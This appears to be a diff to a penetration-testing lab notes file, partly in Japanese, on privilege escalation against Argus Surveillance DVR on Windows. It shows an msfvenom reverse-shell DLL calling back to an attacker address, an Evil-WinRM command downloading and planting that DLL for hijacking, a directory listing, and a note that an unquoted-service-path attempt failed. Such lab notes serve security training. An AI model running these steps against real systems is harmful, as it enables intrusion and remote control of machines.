@@ -12,6 +12,67 @@ gsm_codec.dll
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.104 LPORT=80 -f dll -o gsm_codec.dll
 ```
 
+```sh
+*Evil-WinRM* PS C:\Program Files\Argus Surveillance DVR> iwr -uri http://192.168.49.104:8888/gsm_codec.dll -OutFile .\gsm_codec.dll
+*Evil-WinRM* PS C:\Program Files\Argus Surveillance DVR> dir
+
+
+    Directory: C:\Program Files\Argus Surveillance DVR
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         2/23/2022   3:16 AM                NetCams Models
+-a----          1/5/2008  10:15 PM          81920 ASFcoder.dll
+-a----         1/10/2007   1:36 PM          65536 ASFdecoder.dll
+-a----         12/7/2008   5:09 PM         450048 AudioCaptureDemon.exe
+-a----        10/13/2006   6:54 PM         290304 AudioList.ovl
+-a----          3/2/2007   1:28 PM         971552 BtInstaller.exe
+-a----        12/18/2008   8:49 PM        1348096 Camera.exe
+-a----         11/1/2002  12:11 AM         282624 camfc.dll
+-a----         1/25/2006   5:36 PM         191488 CheckCaptureCards.ovl
+-a----         7/30/2007   6:34 PM             33 CommonSettings.ini
+-a----         1/25/2006   3:55 PM          40960 ConexantScanner.dll
+-a----        10/18/2006  10:49 PM         843824 cv100.dll
+-a----        10/18/2006  10:49 PM        1011764 cxcore100.dll
+-a----         5/18/2006   5:29 PM          65536 decoder.dll
+-a----        12/18/2008   8:50 PM         658760 DVR.exe
+-a----        12/18/2008   8:49 PM         476672 DVRConvertToAVIMPEG.exe
+-a----         12/6/2008  10:19 PM         717824 DVRViewerWindow.exe
+-a----        12/18/2008   8:49 PM         726528 DVRWatchdog.exe
+-a----         4/12/2006   6:59 PM         604015 DVR_Idle.scr
+-a----        12/18/2008   8:50 PM         319488 FaceDetectDemon.exe
+-a----        12/18/2008   8:50 PM         805216 FileExport.exe
+-a----        12/18/2008   8:49 PM         322560 FTPUploader.exe
+-a----         8/18/2008   1:02 PM          90112 G700decoder.dll
+-a----          6/8/2008  10:58 PM         266240 GS4000.dll
+-a----         2/21/2026  10:19 PM           9216 gsm_codec.dll
+-a----         3/16/2005   7:18 PM         861012 haarcascade_frontalface_alt2.xml
+-a----         4/19/2007  11:49 PM         626741 highgui100.dll
+-a----         7/29/2008  10:25 AM          53248 IP207W.dll
+-a----        12/18/2008   8:49 PM         482304 IPCamReceiver.exe
+-a----         12/3/2003  12:00 AM          20480 libavi-dd-1.2.1.dll
+-a----         12/3/2003  12:00 AM        3420160 libfilefmt-1.1.1.dll
+-a----         3/16/2004   3:52 AM         184320 libguide40.dll
+-a----         12/3/2003  12:00 AM         708608 libmcl-3.1.2.dll
+-a----          3/3/2008   2:37 PM         118784 MOBI70170IPCAM.dll
+-a----        12/18/2008   8:49 PM         441856 MP3Coder.exe
+-a----        12/18/2008   8:49 PM         465920 Mpeg4Coder.exe
+-a----         2/20/2008   1:46 PM         320512 MPEGDecode.dll
+-a----         9/12/2005   7:52 PM         287744 NewDialUpConnection.exe
+-a----         2/27/1998  12:25 PM           3968 PCIDUMPR.SYS
+-a----        10/31/2007   6:12 PM         304128 PY_Uninstal.exe
+-a----        12/18/2008   8:49 PM         469504 SearchCameras.exe
+-a----         4/12/2007   5:23 PM         418816 Unregister.exe
+-a----         2/20/2008   1:46 PM          91648 VEO.dll
+-a----         2/24/2022  10:45 AM             58 Viewer.ini
+-a----        12/18/2008   8:49 PM         949248 WebServerForAdmin.exe
+-a----         8/13/2007   3:51 PM         446464 wmvdmoe.dll
+-a----          9/5/2003   3:13 PM          49152 xrlknc.dll
+-a----         9/10/2003  10:40 AM          45056 xrlkncd.dll
+
+```
+
 # Argus surveilance dvr unquoted P.E -> Program Filesが書き込み不可なので失敗
 
 - [Argus Surveillance DVR 4.0 - Unquoted Service Path](https://www.exploit-db.com/exploits/50261)
